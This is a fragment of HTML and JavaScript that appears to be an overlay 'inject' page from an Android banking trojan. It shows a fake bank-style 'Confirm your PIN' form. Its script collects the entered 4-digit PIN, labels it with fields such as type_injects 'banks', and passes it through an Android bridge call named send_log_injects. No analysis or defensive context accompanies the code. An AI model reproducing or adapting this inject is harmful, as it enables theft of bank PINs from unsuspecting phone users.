            <p style="margin-left: -12px;color: #fff;font-size: 18px;font-weight: 600;padding: 0;margin: 0;">Confirm your PIN</p>
        </header>
        <section>
            <label for="pin"> PIN </label>
            <input type="password" class="input" id="pin" name="pin" placeholder="Please enter a 4 digit PIN" maxlength="4" autocomplete="off">
            
            <label for="repeatPIN"> Confirm PIN </label>
            <input type="password" class="input" id="repeatPin" name="repeatPin" placeholder="Please re-enter your 4 digit PIN" maxlength="4" autocomplete="off">
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Next">
        </footer>
    </form>

    <script>
        $('#pin').mask('0000');
        $('#repeatPin').mask('0000');

        var repeatPin = document.getElementById('repeatPin'),
            pin = document.getElementById('pin');

        var sendData = document.getElementById('sendData');

        function check(){
            if(pin.value === repeatPin.value && pin.value.length != 0) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        pin.onkeyup = () => {
            check();
        }

        repeatPin.onkeyup = () => {
            check();
        }

        sendData.onclick = () => {
                var data = {};
                data.pin = pin.value;
                data.repeatPin = repeatPin.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
